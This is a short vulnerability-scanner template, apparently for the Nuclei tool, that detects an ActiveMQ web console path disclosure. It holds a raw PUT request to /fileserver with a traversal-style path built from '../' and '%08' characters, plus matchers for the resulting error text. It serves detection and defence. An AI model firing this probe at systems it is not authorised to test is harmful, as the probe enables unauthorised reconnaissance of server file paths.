id: activemq-web-console-path-leak
info:
  name: ActiveMQ Web Console Path Leak Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: info-leak,activemq
http:
  - raw:
      - |
        PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain

        test
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "(No such file or directory)"
          - "fileserver"
        part: body
